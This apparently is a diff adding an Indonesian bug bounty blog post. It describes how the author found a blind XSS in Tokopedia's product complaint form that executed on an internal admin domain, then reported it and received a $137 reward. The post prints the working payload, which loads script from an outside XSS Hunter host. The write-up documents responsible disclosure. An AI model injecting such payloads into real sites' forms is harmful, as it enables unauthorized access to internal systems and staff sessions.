@@ -1,0 +1,29 @@
+I"¨<p><img src="/images/tokped_banner.jpg" alt="Image of Tokopedia" /></p>
+
+<p>Beberapa waktu lalu iseng-iseng mencoba mencari Bug <em>(lagi)</em> di situs Tokopedia. Karena sebelumnya bug yang ditemukan dianggap tidak valid, jadi rasanya masih <strong>gregetan</strong> karena belum nemu bug yang valid XD.</p>
+
+<p>Setelah beberapa menit muter-muter di website Tokopedia, pada akhirnya saya menemukan Form Pengaduan Merk/Produk yang berada pada URL: https://www.tokopedia.com/contact-us/form/ban-product. Lalu saya mencoba memasukan payload XSS Hunter pada field <strong>Name</strong>, berharap payload akan ter-eksekusi pada backend Tokopedia.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name: Anu"&gt;&lt;script src=//xxs.ht&gt;&lt;/
+</code></pre></div></div>
+
+<p><img src="/images/tokped_band_product.jpg" alt="Image of Tokopedia" /></p>
+
+<p>Selang beberapa jam, saya mendapat notifikasi pada <strong>XSS Hunter</strong> yang menginformasikan bahwa payload ter-eksekusi pada domain https://internal.tokopedia.com! Berikut Screenshot dari halaman tersebut.</p>
+
+<p><img src="/images/tokped_internal_panel.jpg" alt="Image of Tokopedia" /></p>
+
+<p>Saya segera mengirim email ke security@tokopedia.com terkait temuan ini, dan mereka me-respon dan memberitahu bahwa temuan ini valid dengan severity <strong>HIGH</strong>.</p>
+
+<p><img src="/images/tokped_email.jpg" alt="Image of Tokopedia" /></p>
+
+<p>Pihak Tokopedia cukup responsive dalam menangani issue ini, celah ini diperbaiki dalam waktu kurang lebih 2 minggu. Dan untuk temuan ini, saya diberi reward sebesar <strong>$137</strong>.</p>
+
+<p>Timeline:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ 04 Oct 2018 ]: Bug Ditemukan
+[ 04 Oct 2018 ]: Bug Dilaporkan
+[ 04 Oct 2018 ]: Konfirmasi Valid dengan severity **HIGH**
+[ 18 Oct 2018 ]: Bug Selesai Diperbaiki
+[ 21 Nov 2018 ]: Reward sebesar $137
+</code></pre></div></div>
+:ET
